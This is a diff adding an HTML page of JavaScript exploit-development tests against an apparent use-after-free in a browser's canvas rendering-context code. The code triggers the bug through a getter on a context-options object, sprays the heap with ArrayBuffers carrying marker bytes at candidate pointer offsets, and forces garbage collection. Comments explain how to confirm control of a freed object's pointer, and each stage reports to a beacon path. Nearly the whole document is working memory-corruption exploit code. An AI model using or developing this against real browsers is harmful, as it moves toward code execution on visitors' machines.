@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V555</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V555-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+function forceGC(){
+  var junk;
+  for(var g=0;g<50;g++){
+    junk=[];
+    for(var j=0;j<20000;j++)junk.push({a:j,b:'x'.repeat(100)});
+    junk=null;
+  }
+}
+
+b('BOOT','V555-gc-deref-test');
+
+// ==========================================================
+// T1: BASELINE — trigger UAF, null wrapper, GC, survive?
+// If browser survives: wrapper WAS collected AND deref
+// worked (freed memory still has valid m_canvas → deref
+// calls derefCanvasBase on real canvas → OK).
+// This is the NORMAL cleanup path.
+// ==========================================================
+(function T1(){
+  var ctx = triggerUAF();
+  // ctx now dangling. The freed memory still has the
+  // real m_canvas pointer (libpas bitmap alloc doesn't
+  // overwrite freed memory).
+  ctx = null; // remove JS reference
+  // Overwrite stack to prevent conservative GC pinning
+  var a=0,c=0,d=0,e=0,f=0,g=0,h=0;
+  for(var i=0;i<100;i++){a+=i;c+=i*2;d+=i*3;}
+  forceGC();
+  b('T1-SURVIVED','gc-no-spray');
+})();
+
+// ==========================================================
+// T2: UAF + AB spray + null + GC
+// AB spray zeroes the freed slot. m_canvas at offset 32
+// becomes 0. When ~Ref() calls deref():
+//   m_canvas.derefCanvasBase() → reads address 0 → NULL DEREF
+// Expected: crash (confirms deref runs during GC)
+// ==========================================================
+(function T2(){
+  var ctx = triggerUAF();
+  var abs = [];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  ctx = null;
+  var a=0,c=0,d=0,e=0,f=0;
+  for(var i=0;i<100;i++){a+=i;c+=i*2;}
+  forceGC();
+  b('T2-SURVIVED','gc-with-spray-zeroed');
+  // If we get here: either wrapper not collected yet,
+  // or AB didn't reclaim, or m_canvas offset wrong
+  abs=null;
+})();
+
+// ==========================================================
+// T3: UAF + AB spray with VALID m_canvas pointer + null + GC
+// Strategy: create a second canvas, get its address somehow,
+// write it at offset 32 in ABs. If deref succeeds, the
+// SECOND canvas gets an extra deref → refcount decrement.
+// Problem: we don't know the address. So instead:
+// Create the UAF canvas in a way that we can recover its
+// address from the freed memory.
+//
+// Actually, simpler: DON'T spray. Let freed memory keep its
+// valid m_canvas pointer. This should be same as T1.
+// Just verify T1 works consistently.
+// ==========================================================
+(function T3(){
+  var ctx = triggerUAF();
+  ctx = null;
+  var a=0,c=0,d=0,e=0,f=0;
+  for(var i=0;i<100;i++){a+=i;c+=i*2;}
+  forceGC();
+  b('T3-SURVIVED','gc-no-spray-repeat');
+})();
+
+// ==========================================================
+// T4: Multiple rounds of UAF + no-spray + GC
+// Each round: new canvas, new UAF, null, GC
+// The canvas from round N should be freed when nothing
+// else references it. After 20 rounds, we verify we can
+// still create canvases (no resource exhaustion).
+// ==========================================================
+(function T4(){
+  for(var r=0;r<20;r++){
+    var ctx = triggerUAF();
+    ctx = null;
+    // Light GC
+    var jnk;
+    for(var g=0;g<5;g++){
+      jnk=[];for(var j=0;j<5000;j++)jnk.push({x:j});jnk=null;
+    }
+  }
+  forceGC();
+  b('T4-SURVIVED','20-rounds-gc');
+})();
+
+// ==========================================================
+// T5: UAF + spray at offset 32 with 0x41 pattern + GC
+// If deref reads offset 32 and finds 0x4141414141414141,
+// it will try to call derefCanvasBase(0x4141414141414141)
+// → crash at that address.
+// If T1 survived but T5 crashes: CONFIRMS
+//   1) m_canvas is at/near offset 32
+//   2) GC does collect wrapper and call deref
+//   3) We control the deref target via AB
+// ==========================================================
+(function T5(){
+  var ctx = triggerUAF();
+  var abs = [];
+  var u8s = [];
+  for(var i=0;i<50;i++){
+    var ab = new ArrayBuffer(768);
+    abs.push(ab);
+    var u8 = new Uint8Array(ab);
+    u8s.push(u8);
+    // Write pattern at candidate m_canvas offsets
+    // Try 32, 40, 24, 48 to find exact offset
+    // Use different patterns at each offset so we can
+    // identify which one was used
+    // Pattern at off 32: 0x42 (if crash at 0x4242...)
+    for(var j=32;j<40;j++) u8[j]=0x42;
+    // Pattern at off 40: 0x43
+    for(var j=40;j<48;j++) u8[j]=0x43;
+    // Pattern at off 24: 0x44
+    for(var j=24;j<32;j++) u8[j]=0x44;
+    // Pattern at off 48: 0x45
+    for(var j=48;j<56;j++) u8[j]=0x45;
+  }
+  b('T5-SPRAY','done-patterns-written');
+  ctx = null;
+  var a=0,c=0,d=0,e=0,f=0;
+  for(var i=0;i<100;i++){a+=i;c+=i*2;}
+  forceGC();
+  b('T5-SURVIVED','gc-with-patterns');
+  // Check if any AB was modified
+  var changed='none';
+  for(var i=0;i<50;i++){
+    if(u8s[i][32]!==0x42||u8s[i][40]!==0x43){
+      changed='AB['+i+']:off32='+u8s[i][32]+',off40='+u8s[i][40];
+      break;
+    }
+  }
+  b('T5-CHECK',changed);
+  abs=null;u8s=null;
+})();
+
+// ==========================================================
+// T6: TIMING — UAF + spray but keep ctx alive, then GC
+// Wrapper stays alive (ctx is still referenced) so ~Ref()
+// should NOT run. All should survive.
+// ==========================================================
+(function T6(){
+  var ctx = triggerUAF();
+  var abs = [];
+  for(var i=0;i<50;i++){
+    var ab = new ArrayBuffer(768);
+    abs.push(ab);
+    var u8 = new Uint8Array(ab);
+    for(var j=32;j<40;j++) u8[j]=0x42;
+    for(var j=40;j<48;j++) u8[j]=0x43;
+  }
+  // DON'T null ctx — keep wrapper alive
+  forceGC();
+  b('T6-SURVIVED','gc-wrapper-alive');
+  abs=null;
+  // NOW null ctx and GC
+  ctx=null;
+  var a=0,c=0;
+  for(var i=0;i<100;i++){a+=i;c+=i*2;}
+  forceGC();
+  b('T6-PHASE2','gc-after-null');
+})();
+
+b('DONE','V555-all-complete');
+</script>
+</body></html>
